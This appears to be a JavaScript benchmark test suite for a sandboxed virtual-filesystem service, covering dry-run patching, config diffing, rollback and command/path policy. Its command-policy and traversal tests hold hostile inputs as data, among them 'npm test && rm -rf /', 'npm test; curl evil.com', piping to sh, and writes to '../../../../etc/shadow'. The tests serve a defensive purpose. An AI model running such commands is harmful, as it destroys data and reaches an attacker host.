/**
 * GenOS Autonomous Software Engineering (SWE & Code Autonomy) Benchmark Suite
 * High-complexity code modification, pre-flight blast radius, sandbox policy,
 * and rollback challenges:
 * 1. Pre-Flight Blast Radius & VFS Dry-Run Simulation
 * 2. Minimal Semantic Patching & Atomic Replacement in VFS
 * 3. Multi-Component Bug Localization & Configuration Diffing
 * 4. Sandboxed Build/Test Command Verification & Injection Rejection
 * 5. Deterministic VFS Rollback on Test Failure
 * 6. Workspace Confinement & Path Traversal Lockdown
 */

const assert = require('assert');
const vfsService = require('../../src/services/vfsSandboxService');
const { isAllowedSandboxTestCommand, normalizeSandboxCommand } = require('../../src/services/sandboxCommandPolicy');

let passed = 0;
let failed = 0;

function runTest(name, fn) {
  try {
    const result = fn();
    if (result && typeof result.then === 'function') {
      return result
        .then(() => {
          passed += 1;
          console.log(`  [PASS] ${name}`);
        })
        .catch((err) => {
          failed += 1;
          console.error(`  [FAIL] ${name}: ${err.message}`);
        });
    }
    passed += 1;
    console.log(`  [PASS] ${name}`);
    return Promise.resolve();
  } catch (err) {
    failed += 1;
    console.error(`  [FAIL] ${name}: ${err.message}`);
    return Promise.resolve();
  }
}

function diffStructuralStates(left, right, prefix = '') {
  const differences = [];
  const keys = new Set([...Object.keys(left || {}), ...Object.keys(right || {})]);

  for (const key of keys) {
    const path = prefix ? `${prefix}.${key}` : key;
    const a = left?.[key];
    const b = right?.[key];

    if (a && b && typeof a === 'object' && typeof b === 'object' && !Array.isArray(a) && !Array.isArray(b)) {
      differences.push(...diffStructuralStates(a, b, path));
    } else if (JSON.stringify(a) !== JSON.stringify(b)) {
      differences.push({ path, left: a ?? null, right: b ?? null });
    }
  }
  return differences;
}

async function testPreFlightBlastRadius() {
  console.log('\n--- Challenge 1: Pre-Flight Blast Radius & VFS Simulation ---');
  console.log('  Competitor Failure: Writes directly to disk, corrupting codebases without pre-flight.');

  const initialVfs = {
    'src/index.js': 'console.log("hello");',
    'src/config.js': 'module.exports = { port: 8080 };'
  };

  await runTest('1.1 Dry-run captures created and modified files in-memory without disk I/O', () => {
    const dryRun = vfsService.simulateDryRun('genos_create', {
      path: 'src/utils/calc.js',
      content: 'module.exports = (a, b) => a + b;'
    }, initialVfs);

    assert.strictEqual(dryRun.sideEffects.filesCreated.length, 1);
    assert.strictEqual(dryRun.sideEffects.filesCreated[0], 'src/utils/calc.js');
    assert.strictEqual(dryRun.sideEffects.filesModified.length, 0);
    assert.ok(dryRun.predictedVfsDiff.simulatedPaths.includes('src/utils/calc.js'));
    assert.strictEqual(initialVfs['src/utils/calc.js'], undefined, 'Initial state must remain untouched');
  });

  await runTest('1.2 CalculateBlastRadius computes exact risk score based on impact factors', () => {
    const readScore = vfsService.calculateBlastRadius(0, false, 'viewer');
    assert.strictEqual(readScore, 5, 'Baseline read risk is 5');

    const modifyScore = vfsService.calculateBlastRadius(2, false, 'operator');
    // 5 baseline + (2 * 15) = 35
    assert.strictEqual(modifyScore, 35);

    const destructiveAdminScore = vfsService.calculateBlastRadius(3, true, 'admin');
    // 5 baseline + 45 (max) + 35 destructive + 15 admin = 100
    assert.strictEqual(destructiveAdminScore, 100);
  });

  await runTest('1.3 Pre-flight simulation assigns operator role for write operations', () => {
    const dryRun = vfsService.simulateDryRun('replace_file_content', {
      path: 'src/config.js',
      content: 'module.exports = { port: 9090 };'
    }, initialVfs);

    assert.strictEqual(dryRun.requiredPrivilege, 'operator');
    assert.strictEqual(dryRun.sideEffects.filesModified.length, 1);
    assert.strictEqual(dryRun.sideEffects.filesModified[0], 'src/config.js');
  });
}

async function testMinimalSemanticPatching() {
  console.log('\n--- Challenge 2: Minimal Semantic Patching & Atomic Replacement ---');
  console.log('  Competitor Failure: Blindly rewrites 500-line files, wiping out unrelated code.');

  const repoState = {
    'package.json': '{"name": "app", "version": "1.0.0"}',
    'src/auth.js': 'function login() { return true; }\nfunction logout() { return false; }',
    'src/db.js': 'const db = "postgres";'
  };

  await runTest('2.1 Patching existing file mutates target while preserving all sibling files', () => {
    const updatedContent = 'function login() { return verifyJwt(); }\nfunction logout() { return false; }';
    const dryRun = vfsService.simulateDryRun('replace_file_content', {
      path: 'src/auth.js',
      content: updatedContent
    }, repoState);

    assert.strictEqual(dryRun.sideEffects.filesModified.length, 1);
    assert.strictEqual(dryRun.sideEffects.filesModified[0], 'src/auth.js');
    assert.strictEqual(dryRun.sideEffects.filesCreated.length, 0);
    assert.ok(dryRun.predictedVfsDiff.simulatedPaths.includes('src/auth.js'));
    assert.ok(dryRun.predictedVfsDiff.simulatedPaths.includes('src/db.js'));
    assert.ok(dryRun.predictedVfsDiff.simulatedPaths.includes('package.json'));
  });

  await runTest('2.2 Reject missing path or content fields in file operations', () => {
    assert.throws(() => {
      vfsService.simulateDryRun('genos_create', { content: 'missing path' }, repoState);
    }, /require a non-empty path field/);

    assert.throws(() => {
      vfsService.simulateDryRun('genos_create', { path: 'src/empty.js' }, repoState);
    }, /require a string content field/);
  });

  await runTest('2.3 Reject non-canonical argument formats (TargetFile / CodeContent)', () => {
    assert.throws(() => {
      vfsService.simulateDryRun('genos_create', { TargetFile: 'src/test.js', CodeContent: 'code' }, repoState);
    }, /canonical path and content fields/);
  });
}

async function testStructuralBugLocalization() {
  console.log('\n--- Challenge 3: Multi-Component Bug Localization & Configuration Diffing ---');
  console.log('  Competitor Failure: Fails to detect silent property shifts across distributed services.');

  const baselineConfig = {
    service: 'payment-gateway',
    auth: { mode: 'jwt', secretKey: 'sec_alpha', issuer: 'auth0' },
    resilience: { maxRetries: 3, timeoutMs: 5000, circuitOpenOn500: true },
    features: { cryptoPayments: false, instantSettlement: true }
  };

  const regressedConfig = {
    service: 'payment-gateway',
    auth: { mode: 'jwt', secretKey: 'sec_beta_mutated', issuer: 'auth0' },
    resilience: { maxRetries: 3, timeoutMs: 15000, circuitOpenOn500: false },
    features: { cryptoPayments: false, instantSettlement: true }
  };

  await runTest('3.1 Structural diff identifies exact diverging configuration nodes', () => {
    const diffs = diffStructuralStates(baselineConfig, regressedConfig);
    assert.strictEqual(diffs.length, 3, 'Must pinpoint exactly 3 diverging leaf properties');

    const secretDiff = diffs.find(d => d.path === 'auth.secretKey');
    const timeoutDiff = diffs.find(d => d.path === 'resilience.timeoutMs');
    const circuitDiff = diffs.find(d => d.path === 'resilience.circuitOpenOn500');

    assert.ok(secretDiff && secretDiff.left === 'sec_alpha' && secretDiff.right === 'sec_beta_mutated');
    assert.ok(timeoutDiff && timeoutDiff.left === 5000 && timeoutDiff.right === 15000);
    assert.ok(circuitDiff && circuitDiff.left === true && circuitDiff.right === false);
  });

  await runTest('3.2 Identical component configurations return zero differences', () => {
    const diffs = diffStructuralStates(baselineConfig, { ...baselineConfig });
    assert.strictEqual(diffs.length, 0);
  });
}

async function testSandboxedCommandPolicy() {
  console.log('\n--- Challenge 4: Sandboxed Build/Test Command Policy ---');
  console.log('  Competitor Failure: Executes arbitrary unvalidated bash commands, risking host escape.');

  await runTest('4.1 Permitted standard test commands pass policy validation', () => {
    assert.strictEqual(isAllowedSandboxTestCommand('npm test'), true);
    assert.strictEqual(isAllowedSandboxTestCommand('npm run check'), true);
    assert.strictEqual(isAllowedSandboxTestCommand('cargo test'), true);
    assert.strictEqual(isAllowedSandboxTestCommand('cargo test --lib'), true);
    assert.strictEqual(isAllowedSandboxTestCommand('pytest'), true);
    assert.strictEqual(isAllowedSandboxTestCommand('npm test -- unit'), true);
  });

  await runTest('4.2 Malicious command injections with shell chaining are rejected', () => {
    assert.strictEqual(isAllowedSandboxTestCommand('npm test && rm -rf /'), false);
    assert.strictEqual(isAllowedSandboxTestCommand('npm test; curl evil.com'), false);
    assert.strictEqual(isAllowedSandboxTestCommand('npm test | sh'), false);
    assert.strictEqual(isAllowedSandboxTestCommand('npm test `whoami`'), false);
  });

  await runTest('4.3 Unwhitelisted binaries and arbitrary scripts are blocked', () => {
    assert.strictEqual(isAllowedSandboxTestCommand('bash -c "echo hacked"'), false);
    assert.strictEqual(isAllowedSandboxTestCommand('powershell.exe -Command Get-Process'), false);
    assert.strictEqual(isAllowedSandboxTestCommand('python evil_exploit.py'), false);
    assert.strictEqual(isAllowedSandboxTestCommand('rm -rf node_modules'), false);
  });
}

async function testDeterministicRollback() {
  console.log('\n--- Challenge 5: Deterministic VFS Rollback on Test Failure ---');
  console.log('  Competitor Failure: Broken patches remain applied, leaving repositories in corrupt state.');

  const cleanBaselineVfs = {
    'src/core.js': 'export const compute = (x) => x * 2;',
    'src/core.test.js': 'test("compute", () => expect(compute(3)).toBe(6));'
  };

  await runTest('5.1 Broken patch simulation reverts cleanly to baseline snapshot on regression', () => {
    // 1. Snapshot baseline
    const snapshot = { ...cleanBaselineVfs };

    // 2. Candidate patch introduces bug
    const brokenPatch = vfsService.simulateDryRun('replace_file_content', {
      path: 'src/core.js',
      content: 'export const compute = (x) => x * 3; // REGRESSION'
    }, snapshot);

    // 3. Test verification fails (simulated test failure: compute(3) === 9 !== 6)
    const testPassed = false;

    // 4. Rollback
    let activeVfs = brokenPatch.simulatedVfsState;
    if (!testPassed) {
      activeVfs = { ...snapshot };
    }

    assert.strictEqual(activeVfs['src/core.js'], cleanBaselineVfs['src/core.js']);
    assert.strictEqual(activeVfs['src/core.js'].includes('REGRESSION'), false);
  });

  await runTest('5.2 Rollback cancels erroneous file creations without residual ghosts', () => {
    const snapshot = { ...cleanBaselineVfs };
    const addFileDryRun = vfsService.simulateDryRun('genos_create', {
      path: 'src/rogue_leak.js',
      content: 'malicious payload'
    }, snapshot);

    // Rollback
    const restoredVfs = { ...snapshot };
    assert.strictEqual(restoredVfs['src/rogue_leak.js'], undefined);
    assert.strictEqual(Object.keys(restoredVfs).length, 2);
  });
}

async function testWorkspaceConfinement() {
  console.log('\n--- Challenge 6: Workspace Confinement & Path Traversal Lockdown ---');
  console.log('  Competitor Failure: Relative path refactoring escapes repository root.');

  await runTest('6.1 Directory traversal paths are strictly rejected by VFS normalization', () => {
    assert.throws(() => {
      vfsService.simulateDryRun('genos_create', {
        path: '../../Windows/System32/evil.dll',
        content: 'payload'
      }, {});
    }, /Path escapes the workspace/);

    assert.throws(() => {
      vfsService.simulateDryRun('genos_create', {
        path: '../../../../etc/shadow',
        content: 'root:x:0:0:::'
      }, {});
    }, /Path escapes the workspace/);
  });

  await runTest('6.2 Valid relative workspace paths normalize cleanly', () => {
    const dryRun = vfsService.simulateDryRun('genos_create', {
      path: 'src/helpers/clean.js',
      content: 'export default {};'
    }, {});

    assert.strictEqual(dryRun.sideEffects.filesCreated[0], 'src/helpers/clean.js');
  });
}

async function main() {
  console.log('======================================================================');
  console.log('   GenOS Autonomous Software Engineering (SWE) Benchmark Suite');
  console.log('======================================================================');

  await testPreFlightBlastRadius();
  await testMinimalSemanticPatching();
  await testStructuralBugLocalization();
  await testSandboxedCommandPolicy();
  await testDeterministicRollback();
  await testWorkspaceConfinement();

  console.log('\n======================================================================');
  console.log(`TOTAL SWE BENCHMARK TESTS: ${passed + failed}`);
  console.log(`PASSED: ${passed}`);
  console.log(`FAILED: ${failed}`);
  console.log('======================================================================\n');

  if (failed > 0) {
    process.exit(1);
  }
}

main().catch((err) => {
  console.error('Fatal benchmark error:', err);
  process.exit(1);
});
